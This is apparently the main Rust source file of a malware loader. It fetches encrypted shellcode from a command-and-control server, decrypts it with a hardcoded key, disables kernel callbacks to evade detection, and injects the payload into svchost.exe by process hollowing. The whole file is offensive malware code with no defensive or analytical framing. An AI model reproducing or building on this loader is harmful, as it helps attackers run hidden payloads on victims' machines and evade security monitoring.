mod hollowing;
mod encryption;
mod syscalls;
mod stealth;
mod c2;

use std::process::exit;

fn main() {
    // Fetch Encrypted Shellcode from C2
    let encrypted_shellcode = c2::fetch_encrypted_payload();

    let key: [u8; 16] = *b"mysecretkey12345"; 
    let nonce: [u8; 16] = *b"random_iv_nonce_"; // Must be exactly 16 bytes

    let decrypted_shellcode = encryption::decrypt_shellcode(&encrypted_shellcode, &key, &nonce);

    // Apply Kernel Stealth Before Execution
    stealth::disable_callbacks();

    // Process Hollowing (Inject into a new process)
    let target_process = "C:\\Windows\\System32\\svchost.exe";

    unsafe {
        hollowing::hollow_process(target_process, &decrypted_shellcode);
    }
    
    exit(0);
}